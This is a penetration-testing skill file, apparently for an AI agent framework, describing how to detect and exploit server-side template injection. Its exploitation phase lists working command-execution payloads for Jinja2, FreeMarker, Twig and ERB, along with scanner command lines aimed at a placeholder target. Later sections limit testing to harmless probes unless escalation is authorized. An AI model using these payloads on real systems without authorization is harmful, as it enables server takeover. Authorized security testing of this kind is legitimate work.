---
name: attack-ssti
description: "Detect and validate server-side template injection with harmless expression probes and bounded impact checks"
category: "web-application"
version: "1.1.0"
author: "cyberstrike-official"
tags:
  - ssti
  - rce
  - injection
  - web
  - attack
tech_stack:
  - web
  - python
  - java
  - ruby
  - php
cwe_ids:
  - CWE-94
  - CWE-1336
chains_with:
  - attack-ssrf
prerequisites: []
severity_boost:
  attack-ssrf: "SSTI → SSRF → internal service access = RCE chain"
---

# Server-Side Template Injection (SSTI)

## Objective

Detect and exploit server-side template injection to achieve code execution on the server.

## Testing Methodology

### Phase 1: Detection

```bash
# Automated SSTI detection across 7 engines
attack_script ssti_tester "https://TARGET/search?q=FUZZ" --param q --json-output

# Quick mode (math payloads only)
attack_script ssti_tester "https://TARGET/render" --param template --quick
```

### Phase 2: Generic Detection Payloads

Inject into every user-controlled parameter:

```
{{7*7}}           → 49 (Jinja2, Twig)
${7*7}            → 49 (FreeMarker, Velocity, EL)
<%= 7*7 %>        → 49 (ERB, JSP)
#{7*7}            → 49 (Thymeleaf)
{{7*'7'}}         → 7777777 (Jinja2 string multiplication)
```

### Phase 3: Engine Fingerprinting

```
{{config.items()}}                    → Jinja2 (Flask/Python)
{{request.application.__globals__}}   → Jinja2
${T(java.lang.Runtime)}               → Spring EL
<#assign x=1>${x}                     → FreeMarker
{{_self.env.getFilter('id')}}         → Twig (PHP)
<%= system('id') %>                   → ERB (Ruby)
```

### Phase 4: Exploitation

**Jinja2 (Python/Flask):**
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()}}
```

**FreeMarker (Java):**
```
${"freemarker.template.utility.Execute"?new()("id")}
```

**Twig (PHP):**
```
{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
```

**ERB (Ruby):**
```
<%= `id` %>
<%= system('id') %>
```

### Phase 5: POST-based Injection

```bash
# Test POST parameters
attack_script ssti_tester "https://TARGET/api/render" --param content --method POST --data '{"content":"FUZZ"}'
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Harmless template expression evaluated (for example, 7*7=49) | Confirms an SSTI primitive; severity depends on context and demonstrated impact |
| Sensitive configuration data disclosed in an approved test environment | Severity depends on data sensitivity and exposure |
| Server-side command execution demonstrated | Severity depends on privileges, reachable systems, and actual impact |
| Sensitive file read demonstrated with an approved canary | Severity depends on file sensitivity and impact |

## Evidence Requirements

- Injection point (parameter, endpoint)
- Payload sent
- Server response showing template evaluation
- Template engine identified
- For RCE: command output in response

## Tools

- `attack_script ssti_tester` — automated multi-engine detection
- `tplmap` (external) — SSTI exploitation framework

## Safe Expression-Detection Sequence

Use a harmless arithmetic expression to distinguish evaluation from reflection. Test only in a field that the application is expected to render, and compare it with a plain-text baseline.

```text
{{7*7}}
${7*7}
<%= 7*7 %>
```

These are candidate syntax probes, not a universal payload. A result of `49` in the server-rendered output is a strong evaluation signal for the matching syntax; an echoed input, client-side template result, or generic error is not enough. Test one syntax at a time and avoid deliberately malformed expressions unless the program permits error-based fingerprinting.

- Fingerprint the engine only after server-side evaluation is confirmed; a framework banner or stack trace alone does not establish SSTI.
- Do not escalate from evaluation to command execution, file reads, or outbound callbacks unless the engagement explicitly authorizes that impact test. Prefer a harmless proof and report the exact demonstrated level.

## Verification and False Positives

- Start with a harmless arithmetic or string expression appropriate to the suspected template engine. Confirm that the server evaluates the expression; seeing the input echoed unchanged is reflection, not SSTI.
- Change one expression at a time and compare against a baseline response. Exclude client-side rendering, cached content, sanitization, and WAF-generated errors before concluding the server template engine evaluated input.
- Fingerprint the engine only after server-side evaluation is confirmed. A stack trace or framework name alone does not prove exploitable SSTI.
- Use a harmless proof of evaluation. Do not run operating-system commands, read secrets, open reverse shells, or alter application state unless the engagement explicitly authorizes that level of testing and a safe test environment is available.
- Report RCE only when code execution is actually demonstrated within scope. Template expression evaluation, file access, and command execution are different impact levels.
- Record the exact parameter/template context, baseline, harmless expression, evaluated result, and any limitations. Redact secrets and session data.
- [uphiago/recon-skills — SSTI hunting](https://github.com/uphiago/recon-skills/blob/main/redteam/hunt-ssti/SKILL.md) (external research reference; not a local Cyber Strike skill path).
- [elementalsouls/Claude-BugHunter — SSTI hunting](https://github.com/elementalsouls/Claude-BugHunter/blob/main/skills/hunt-ssti/SKILL.md) (external research reference; not a local Cyber Strike skill path).

## References

- [PortSwigger: SSTI](https://portswigger.net/research/server-side-template-injection)
- [PayloadsAllTheThings: SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
